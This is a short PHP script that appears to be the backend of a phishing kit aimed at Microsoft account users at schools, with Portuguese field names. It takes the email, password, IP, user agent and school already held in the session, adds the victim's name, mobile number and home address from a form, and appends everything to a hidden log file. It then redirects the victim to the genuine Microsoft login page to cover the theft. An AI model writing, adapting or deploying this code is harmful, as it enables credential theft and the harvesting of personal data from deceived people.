<?php

    session_start();

    $email = $_SESSION['email'];
    $password = $_SESSION['password'];
    $user_agent =  $_SESSION['user_agent'];
    $ip = $_SESSION['ip'];
    $escola = $_SESSION['escola'];

    $morada = $_POST['morada'];
    $nome = $_POST['nome'];
    $telemovel = $_POST['telemovel'];

    $fileName = 'E4D0024355A9238A1F68C8B013FD0731F83B3D8986F2C2FB44D4A4B77F91EBDB_phase2.txt';

    $myfile = fopen($fileName, "a+") or die("Unable to open file!");
    fwrite($myfile, $email.':'.$password.' agent='.$user_agent.' ip='.$ip. ' escola=' . $escola . '||nome='. $nome . ' telemovel='.$telemovel . ' Morada=' . $morada . "\n");
    fclose($myfile);

    session_destroy();

    header('Location: https://login.microsoftonline.com/');

?>